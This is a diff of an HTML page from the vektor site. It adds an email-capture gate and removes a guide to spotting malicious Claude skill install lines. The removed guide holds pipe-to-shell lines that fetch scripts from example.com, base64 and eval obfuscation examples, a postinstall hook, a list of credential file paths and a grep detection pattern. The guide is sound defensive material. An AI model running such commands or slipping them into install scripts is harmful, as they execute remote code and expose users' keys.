@@ -16,6 +16,7 @@
 <meta property="og:site_name" content="vektor">
 <meta property="og:url" content="https://vektor-fm.github.io/vektor-site/no-038.html">
 <link rel="canonical" href="https://vektor-fm.github.io/vektor-site/no-038.html">
+
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Don't install another Claude skill until you can read the install line. — vektor /// no. 038">
 <meta name="twitter:description" content="Two steps, thirty seconds, four red flags — with the exact grep line. Plus where the 341-of-2,857 ClawHub number comes from, and why it isn't Claude's rate. Sources read 21 Aug 2026.">
@@ -518,6 +519,59 @@ img{display:block; max-width:100%;}
 .midcap .btn{min-height:48px;}
 .midcap .note{font-size:var(--fs-s); color:var(--meta); margin-top:var(--p-s);}
 
+/* ---- the gate (2026-08-26, founder picked "paper block") ----
+   The page ends here for anyone who hasn't paid the email, so it is built as a
+   destination, not a footer widget. The block flips to PAPER on an otherwise
+   all-black site: it is the only light surface in the whole design system, which
+   is what makes it the loudest object on the page without adding decoration.
+   Colours are hard-coded near-black rather than var(--fg) because this is the
+   one inverted surface — the tokens all assume ink-on-black.
+   The manifest rows are generated from the payload (build.mjs): real file names
+   and line counts, redacted. Structure, never a readable line — a readable
+   teaser measurably lowers conversion (docs/2026-08-26-gate-ui-research.md). */
+.gate{position:relative; margin:var(--p-2xl) 0 0; padding:var(--p-2xl) var(--rail) var(--p-4xl); background:var(--bg); border-top:1px solid var(--rule);}
+.gate .inner{background:var(--paper); color:#0B0B0B; padding:var(--p-xl) var(--p-l) var(--p-l); border:1px solid #0B0B0B; max-width:720px;}
+.gate .tab{display:inline-block; margin-bottom:-1px; background:var(--accent); color:#04120F; font-family:var(--font-label); text-transform:uppercase; letter-spacing:.05em; font-size:var(--fs-s); padding:6px 14px;}
+.gate .k{display:block; color:#0B0B0B; opacity:.7; font-family:var(--font-label); text-transform:uppercase; letter-spacing:.025em; font-size:var(--fs-s); margin-bottom:var(--p-s);}
+.gate h2{color:#0B0B0B; font-family:var(--font-extended); font-weight:400; text-transform:uppercase; letter-spacing:normal; font-size:var(--fs-2xl); line-height:var(--lh-2xl); margin:0 0 var(--p-s);}
+.gate .lede{color:#2A2A2A; font-size:var(--fs-m); line-height:var(--lh-xl); max-width:52ch; margin:0 0 var(--p-l);}
+
+.manifest{list-style:none; margin:0 0 var(--p-xl); padding:0;}
+.manifest li{display:flex; align-items:center; gap:var(--p-s); padding:10px 0; border-top:1px solid #0B0B0B; font-family:var(--font-code); font-size:var(--fs-s); color:#0B0B0B;}
+.manifest li:last-child{border-bottom:1px solid #0B0B0B;}
+.manifest .lk{color:#0B7A69;}
+.manifest .fn{white-space:nowrap; overflow:hidden; text-overflow:ellipsis;}
+/* the redaction: it has to read as "text is here and you can't have it", so it
+   is a bar of glyph-width blocks rather than a plain rule */
+.manifest .rd{flex:1 1 30px; min-width:20px; height:10px; opacity:.35; background:repeating-linear-gradient(90deg,#0B0B0B 0 12px, transparent 12px 18px);}
+.manifest .ln{color:#4A4A4A; white-space:nowrap;}
+
+.gate-form{display:flex; gap:var(--p-s); flex-wrap:wrap; max-width:560px;}
+.gate-form input{flex:1 1 240px; min-height:52px; background:transparent; border:0; border-bottom:2px solid #0B0B0B; color:#0B0B0B; font-family:var(--font-sans); font-size:var(--fs-m); padding:0;}
+.gate-form input::placeholder{color:#6A6A6A;}
+.gate-form input:focus{outline:none; border-bottom-color:#0B7A69;}
+.gate-form .btn{min-height:52px; padding:0 var(--p-l); background:#0B0B0B; color:var(--paper); border:1px solid #0B0B0B;}
+.gate-form .btn:hover{background:#0B7A69; border-color:#0B7A69;}
+/* On a phone the field and the button stop competing for one row: mobile is
+   ~83% of the traffic and converts at about half the desktop rate, so the tap
+   target gets the full width. */
+@media (max-width:620px){
+  .gate-form input{flex:1 1 100%;}
+  .gate-form .btn{flex:1 1 100%; text-align:center; justify-content:center;}
+}
+.gate .note{font-size:var(--fs-s); color:#4A4A4A; margin-top:var(--p-m);}
+.gate .note a{color:#0B7A69;}
+/* social proof, at the decision point rather than in the footer. Real numbers
+   only — see build.mjs, they come from site.json with an as-of date. */
+.gate .proof{margin-top:var(--p-s); font-family:var(--font-label); text-transform:uppercase; letter-spacing:.025em; font-size:var(--fs-s); color:#4A4A4A;}
+.gate .proof b{color:#0B7A69; font-weight:400;}
+
+/* the receipt at the top of an unlock page */
+.unlocked{margin:0; padding:var(--p-xl) var(--rail); background:var(--band); border-bottom:1px solid var(--rule);}
+.unlocked .k{display:block; color:var(--accent); font-family:var(--font-label); text-transform:uppercase; letter-spacing:.025em; font-size:var(--fs-s); margin-bottom:var(--p-s);}
+.unlocked h2{font-family:var(--font-extended); font-weight:400; text-transform:uppercase; letter-spacing:normal; font-size:var(--fs-2xl); line-height:var(--lh-2xl); margin:0 0 var(--p-xs);}
+.unlocked p{font-size:var(--fs-m); line-height:var(--lh-xl); max-width:64ch; margin:0; color:var(--dim);}
+
 /* ---- footer ---- */
 footer{margin-top:var(--p-4xl); padding:var(--p-2xl) var(--rail) var(--p-4xl); border-top:1px solid var(--rule);}
 .foot-rule{margin-bottom:var(--p-xl);}
@@ -717,7 +771,7 @@ pre.code code{font-size:inherit;}
           <li><a href="./no-015.html"><span class="a">→</span><span>Loops</span></a></li>
           <li><a href="./no-010.html"><span class="a">→</span><span>CLAUDE.md files</span></a></li>
         </ul>
-        <p class="info">The files behind the films. Free, no signup wall.</p>
+        <p class="info">The files behind the films. One email opens any of them.</p>
       </div>
     </li>
     <li>
@@ -755,40 +809,41 @@ pre.code code{font-size:inherit;}
 <!-- the issue marker, kept: it is the only per-page label in the bar -->
 <div class="issue-marker">Claude Code · Skill Supply Chain</div>
 
+<!-- The capture furniture (sticky bar + pop-up) lives in partials/capture.html
+     and is injected ONLY into public pages. Unlock pages get an empty string
+     here — see build.mjs. The weave stays on both: it is structure, not an ask. -->
 <!-- Sticky ask. This used to be a Follow link back to Instagram, which spent
      an IG click to win a visit and then returned the visitor to IG without
      capturing anything. The goal is the email address, so the persistent ask
-     is now the email. Follow demotes to the footer. -->
+     is now the email. Follow demotes to the footer.
+
+     Since 2026-08-26 the form carries the PAGE's tag (no038-sticky) rather
+     than a generic one: the worker reads the tag to decide which pack to
+     unlock, so a generic tag would capture the email and then have nothing to
+     hand back. The suffix keeps per-source attribution.
+
+     THE POP-UP IS GONE (founder, 2026-08-26). It was dismissed 13 times out of
+     13 on NO.036 and 5 out of 5 on NO.039 (live /report, 2026-08-26) — it
+     converted nothing and spent goodwill on every visit. With a real gate at
+     the end of the page there are now two asks, not three. The pop-up's script
+     in partials/scripts.html no-ops on its own (`if(!pop){return;}`), so it is
+     left in place rather than ripped out; restoring the block restores it.
+
+     This whole file is omitted from unlock pages — asking a reader for the
+     email they just gave you is how a funnel reads as a machine. -->
 <div class="sticky-cta" id="stickyCta" aria-hidden="true">
   <span class="t">the Skill Security pack + one working setup a week</span>
   <form class="sticky-form" method="post" action="https://vektor-ig-dm.vektor-fm.workers.dev/signup" data-capture="sticky">
-      <input type="hidden" name="tag" value="masthead-sticky">
+      <input type="hidden" name="tag" value="no038-sticky">
       <input type="text" name="company" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0">
     <label class="sr-only" for="stickyEmail">Email address</label>
     <input id="stickyEmail" name="email" type="email" placeholder="you@email.com" autocomplete="email" required>
-    <button class="btn primary" type="submit">Get it &rarr;</button>
+    <button class="btn primary" type="submit">Open it &rarr;</button>
   </form>
   <button class="x" id="ctaClose" type="button" aria-label="Dismiss">&times;</button>
 </div>
 
 <div class="weave" aria-hidden="true"></div>
-
-<div class="pop" id="packPop" hidden>
-  <div class="pop-scrim" data-pop-close></div>
-  <div class="pop-card" role="dialog" aria-modal="true" aria-labelledby="popH">
-    <button class="pop-x" type="button" data-pop-close aria-label="Close">×</button>
-    <span class="k">One email a week · the working setup</span>
-    <h2 id="popH">Take Skill Security with you.</h2>
-    <p>Free, no wall. Add your email and The Teardown sends the Skill Security pack plus one working AI setup a week.</p>
-    <form action="https://vektor-ig-dm.vektor-fm.workers.dev/signup" method="post" data-capture="popup">
-      <input type="hidden" name="tag" value="masthead-popup">
-      <input type="text" name="company" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0">
-      <input type="email" name="email" placeholder="you@email.com" aria-label="Email address" autocomplete="email" required>
-      <button class="btn" type="submit">Get the weekly pack →</button>
-    </form>
-    <div class="note">Free. The config pack lands in your inbox straight away. Unsubscribe anytime.</div>
-  </div>
-</div>
 
 <main>
 <section class="hero">
@@ -796,119 +851,61 @@ pre.code code{font-size:inherit;}
   <h1 class="disp">Don't install another Claude skill,<br>until you can read the install line<span class="dot">.</span></h1>
   <p class="sub">A skill is not an app. <code>SKILL.md</code> is an instruction file your agent reads and follows, and most skills ship an install line that runs on your machine, as you, with your keys — before Claude does anything. On ClawHub, the only agent-skill hub anyone has published an audit of, Koi Security counted 341 malicious skills out of 2,857 — almost 1 in 8. Two steps stop most of it: pick the skill with <code>find-skills</code> instead of browsing, then read the install line for four red flags. Thirty seconds. Every figure below was read from its own source on 21 August 2026.</p>
   <div class="actions">
-    <a class="btn primary" href="#flags">The four red flags ↓</a>
-    <a class="btn" href="#thirty">The grep line →</a>
-    <a class="btn" href="./files/no-038/skill-red-flags.md">Download the checklist (.md) &darr;</a>
+    <a class="btn primary" href="#gate">The four red flags ↓</a>
+    <a class="btn" href="#gate">The grep line →</a>
+    <a class="btn" href="#gate">Download the checklist (.md) &darr;</a>
     <button class="btn" id="shareBtn" type="button">Send to whoever installs skills off GitHub unopened</button>
   </div>
   <div class="rule" aria-hidden="true">////////////////////////////////////////////////////////////////////////////////////////////////</div>
 </section>
 
 <!-- ======================= STEP ONE ======================= -->
-<div class="fig">
-  <h2 class="kick">Fig. 01 ·</h2>
-  <span class="gaccent">pick it before you audit it</span>
-  <span class="line"></span>
-</div>
+<!-- THE GATE. Founder decision 2026-08-26: the packs stop being free-to-scroll,
+     and the ask is the loudest object on the page. ~700 landing-page opens in 30
+     days produced 6 form clicks (live /report, 2026-08-26), so the pages were
+     handing the payload over before the ask and the ask had no leverage.
 
-<section class="issues" id="pick">
-  <p class="note">Auditing is step two. Step one is not browsing a directory of 23,600+ skills and guessing.</p>
-  <div class="snippet">
-    <div class="bar"><span class="f">claude code · marketplace</span><button class="snipbtn" type="button" data-copy-target="#snipFind" data-copy-event="copy-install">Copy</button></div>
-    <pre id="snipFind">/plugin marketplace add vercel-labs/find-skills</pre>
+     The payload is NOT in this document. build.mjs splits the body at the first
+     <div class="fig"> and writes everything below it to a separate unlock page
+     whose URL only the funnel worker knows. There is nothing here to view-source.
+
+     WHY IT LOOKS LIKE THIS (founder picked A1, "paper block", 2026-08-26):
+     - Cream on an all-black site. It is the only light surface anywhere in the
+       design system, so the eye lands on it before it reads a word. Loud through
+       contrast rather than through decoration.
+     - The manifest lists the REAL payload — file names and line counts pulled
+       from the page's own snippets at build time, redacted. Paywall CRO is
+       consistent that showing what is missing beats describing it, and a
+       manifest cannot be faked into promising something the pack doesn't hold.
+     - It shows structure, never a readable line. Behavioural data on news
+       paywalls (Journalism Studies, 2024) found a readable teaser measurably
+       LOWERS subscribe clicks — curiosity gets satisfied and the reader leaves.
+     - One field. Single-field forms benchmark at ~25.5%, and every extra field
+       is the highest-cost thing you can add.
+     - The note kills the objection single opt-in always raises: nothing to
+       confirm, nothing to wait for.
+     Evidence + sources: docs/2026-08-26-gate-ui-research.md -->
+<section class="gate paper" id="gate">
+  <div class="tab">Locked</div>
+  <div class="inner">
+    <span class="k">1 file · 1 line · locked</span>
+    <h2>The install-line teardown, in full.</h2>
+    <p class="lede">Every section below is written and sitting on the next screen. One email opens all of it.</p>
+
+    <ul class="manifest">
+      <li><span class="lk">▣</span><span class="fn">package.json</span><span class="rd" aria-hidden="true"></span><span class="ln">1 line</span></li>
+    </ul>
+
+    <form class="gate-form" action="https://vektor-ig-dm.vektor-fm.workers.dev/signup" method="post" data-capture="gate">
+      <input type="hidden" name="tag" value="no038">
+      <input type="text" name="company" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0">
+      <label class="sr-only" for="gateEmail">Email address</label>
+      <input id="gateEmail" name="email" type="email" placeholder="you@email.com" autocomplete="email" inputmode="email" required>
+      <button class="btn primary" type="submit">Open the file &rarr;</button>
+    </form>
+    <div class="note">Opens on the next screen — no confirmation email, no waiting room. One-click unsubscribe. <a href="./privacy.html">What we do with it</a>.</div>
+    <div class="proof"><b>622</b> packs sent to people who asked · <b>1,338</b> follow @vektor.fm · one working setup a week</div>
   </div>
-  <p class="meta">Then describe the job — “I need something that reviews my SQL migrations” — and it fetches the skill that fits. <code>find-skills</code> is the most-installed skill in the largest directory: <b>3M installs</b>, read from claudemarketplaces.com on 21 August 2026. Pick it, then read it.</p>
-</section>
-
-<!-- ======================= THE FOUR RED FLAGS ======================= -->
-<div class="fig">
-  <h2 class="kick">Fig. 02 ·</h2>
-  <span class="gaccent">the install line, before it runs</span>
-  <span class="line"></span>
-</div>
-
-<section class="issues" id="flags">
-
-  <article class="issue">
-    <h3><span class="num">1.</span> A pipe straight into a shell</h3>
-    <p>You never see what runs. The server can serve one thing to a browser and another to <code>curl</code>, so “I checked the URL” proves nothing. It also runs as you — same file access, same keys, same tokens.</p>
-    <div class="snippet">
-      <div class="bar"><span class="f">install line · red flag</span></div>
-      <pre id="snipFlag1">curl -fsSL https://example.com/install.sh | bash
-wget -qO- https://example.com/i.sh | sh
-iwr -useb https://example.com/i.ps1 | iex</pre>
-    </div>
-    <p class="meta"><b>What good looks like:</b> the skill tells you to download the script, then run it as a separate step. Two commands instead of one is the whole difference.</p>
-  </article>
-
-  <article class="issue">
-    <h3><span class="num">2.</span> Anything base64 (or hex, or <code>eval</code>)</h3>
-    <p>There is no legitimate reason for an install step to hide what it says. Encoding is there to get a payload past your eyes and past a reviewer's <code>grep</code>.</p>
-    <div class="snippet">
-      <div class="bar"><span class="f">install line · red flag</span></div>
-      <pre id="snipFlag2">echo aGVsbG8gd29ybGQ= | base64 -d | bash
-eval "$(printf '\x63\x75\x72\x6c ...')"
-python -c "exec(__import__('base64').b64decode('...'))"</pre>
-    </div>
-    <p class="meta"><b>What good looks like:</b> decode it before you decide — <code>base64 -d</code> on its own, with no pipe into a shell.</p>
-  </article>
-
-  <article class="issue">
-    <h3><span class="num">3.</span> A post-install hook</h3>
-    <p>It runs on <code>npm install</code> / <code>pip install</code> without you typing anything. You think you're fetching a dependency; you're executing the author's code. This is the single most-used route in real package-ecosystem attacks.</p>
-    <div class="snippet">
-      <div class="bar"><span class="f">package.json</span></div>
-      <pre id="snipFlag3">"scripts": { "postinstall": "node ./scripts/setup.js" }</pre>
-    </div>
-    <p class="meta"><b>What good looks like:</b> setup you invoke yourself, after you've read it.</p>
-  </article>
-
-  <article class="issue">
-    <h3><span class="num">4.</span> Anything reaching for credentials</h3>
-    <p>A skill that formats your commits has no business reading your SSH keys. Credential paths in an install script are the payload, not a feature. Pair this with any outbound request and you are looking at exfiltration.</p>
-    <div class="snippet">
-      <div class="bar"><span class="f">install line · red flag</span></div>
-      <pre id="snipFlag4">~/.ssh/id_rsa      ~/.ssh/id_ed25519     ~/.aws/credentials
-~/.config/gh/hosts.yml                   ~/.npmrc
-security find-generic-password           # macOS keychain
-~/.config/gcloud/                        .env</pre>
-    </div>
-  </article>
-</section>
-
-<!-- ======================= THE THIRTY-SECOND PASS ======================= -->
-<div class="fig">
-  <h2 class="kick">Fig. 03 ·</h2>
-  <span class="gaccent">the thirty-second pass</span>
-  <span class="line"></span>
-</div>
-
-<section class="issues" id="thirty">
-  <p class="note">Open <code>SKILL.md</code> and any install script it points at, then:</p>
-  <div class="snippet">
-    <div class="bar"><span class="f">terminal · the grep line</span><button class="snipbtn" type="button" data-copy-target="#snipGrep" data-copy-event="copy-install">Copy</button></div>
-    <pre id="snipGrep">grep -nEi 'curl|wget|\| *(ba)?sh|iex|base64|eval|exec\(|postinstall|preinstall|\.ssh|credentials|keychain|\.npmrc|\.env' SKILL.md install.sh</pre>
-  </div>
-  <p class="meta">Nothing back? Install it. Something back? Read that line and decide — some are fine in context (a skill that <i>is</i> a deploy tool will legitimately touch credentials, and should say so in plain words at the top). The rule that survives every case: <b>if the install step hides what it does, that is the finding.</b> You do not need to prove intent.</p>
-</section>
-
-<!-- ======================= SOURCING ======================= -->
-<div class="fig">
-  <h2 class="kick">Fig. 04 ·</h2>
-  <span class="gaccent">where every number came from</span>
-  <span class="line"></span>
-</div>
-
-<section class="issues" id="sourcing">
-  <p class="note">Every quantity on this page and in the film was independently read from its own source on <b>21 August 2026</b>.</p>
-  <article class="issue">
-    <h3>The numbers</h3>
-    <p><b>23,600+ Claude skills indexed</b> — claudemarketplaces.com/skills. <b>3M installs</b> for <code>find-skills</code>, the most-installed skill in that directory — same source. <b>472 malicious skills flagged</b> on ClawHub — SlowMist's MistEye threat intelligence, published 9 February 2026, corroborated by the detector set in github.com/smartchainark/skill-security-audit, which is built on it. <b>341 malicious of 2,857 total (11.9%, “almost 1 in 8”)</b> on ClawHub — Koi Security.</p>
-  </article>
-  <article class="issue">
-    <h3>Read this caveat</h3>
-    <p>ClawHub is the skill hub for OpenClaw. It is the hub that got audited, and the almost-1-in-8 rate is <b>its</b> rate. Nobody has published an equivalent audit of the Claude skills directory, so that figure is <b>not a measured rate for the skills you install</b> — it is the best evidence anyone has about what an unaudited agent-skill hub looks like when someone finally looks. Treat it as a reason to check, not as a statistic about Claude.</p>
-  </article>
 </section>
 </main>
 
